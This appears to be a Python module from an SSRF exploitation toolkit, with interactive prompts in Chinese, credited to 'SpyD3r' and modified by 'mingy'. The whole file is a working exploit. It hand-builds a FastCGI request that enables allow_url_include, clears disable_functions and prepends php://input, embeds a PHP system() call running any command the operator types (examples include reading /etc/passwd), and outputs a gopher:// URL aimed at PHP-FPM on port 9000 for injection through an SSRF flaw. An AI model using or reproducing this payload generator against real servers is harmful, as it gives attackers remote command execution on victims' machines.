import urllib
import urllib.parse
from .colors import c, DIM, BOLD, CYAN, YELLOW, GREEN, RED, UNDERLINE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_YELLOW, print_banner, print_step, print_info, print_success, print_warning


def FastCGI():
    print_banner("FastCGI/FPM SSRF 利用")

    print_step(1, "配置目标文件")
    print_info("指定目标服务器上存在的 PHP 文件路径")
    print_warning("常见路径: /var/www/html/index.php 或 /usr/share/php/PEAR.php")
    filename = input(
        c("  > 目标文件路径 (直接回车使用默认): ", CYAN)
    )
    if not filename:
        filename = "/usr/share/php/PEAR.php"
        print_info(f"使用默认值: {filename}")

    print_step(2, "配置执行命令")
    print_info("输入要在目标服务器上执行的系统命令")
    print_warning("示例: whoami, id, ls -la, cat /etc/passwd")
    command = input(c("  > 执行命令: ", CYAN))
    while not command:
        print(c("  [x] 命令不能为空，请重新输入", RED))
        command = input(c("  > 执行命令: ", CYAN))

    length = len(command) + 52
    char = chr(length)

    data = (
        "\x0f\x10SERVER_SOFTWAREgo / fcgiclient \x0b\tREMOTE_ADDR127.0.0.1\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0e"
        + chr(len(str(length)))
    )
    data += (
        f"CONTENT_LENGTH{str(length)}"
        + "\x0e\x04REQUEST_METHODPOST\tKPHP_VALUEallow_url_include = On\n"
    )
    data += (
        "disable_functions = \nauto_prepend_file = php://input\x0f"
        + chr(len(filename))
        + "SCRIPT_FILENAME"
        + filename
        + "\r\x01DOCUMENT_ROOT/"
    )

    temp1 = chr(len(data) // 256)
    temp2 = chr(len(data) % 256)
    temp3 = chr(len(data) % 8)

    end = (
        str("\x00" * (len(data) % 8))
        + "\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00"
        + char
        + "\x04\x00"
    )
    end += f"<?php system('{command}');die('-----Made-by-SpyD3r-----\n');?>\x00\x00\x00\x00"

    start = (
        "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01"
        + temp1
        + temp2
        + temp3
        + "\x00"
    )

    payload = start + data + end

    def get_payload(payload):
        finalpayload = (
            urllib.parse.quote_plus(payload).replace("+", "%20").replace("%2F", "/")
        )
        return f"gopher://127.0.0.1:9000/_{finalpayload}"

    print_banner("利用链接已生成")
    print("")
    print(c("  将以下 URL 编码到 SSRF 漏洞中:", CYAN))
    print("")
    print(c("  " + "-" * 48, DIM))
    print(c(get_payload(payload), UNDERLINE + YELLOW))
    print(c("  " + "-" * 48, DIM))
    print("")
    print_success(f"命令将在目标服务器上执行: {command}")

    print("\n" + c("  " + "=" * 48, BRIGHT_CYAN))
    print(c("  原作者: $_SpyD3r_$", BRIGHT_CYAN))
    print(c("  修改者: @_mingy_@", BRIGHT_CYAN))
    print(c("  " + "=" * 48, BRIGHT_CYAN))
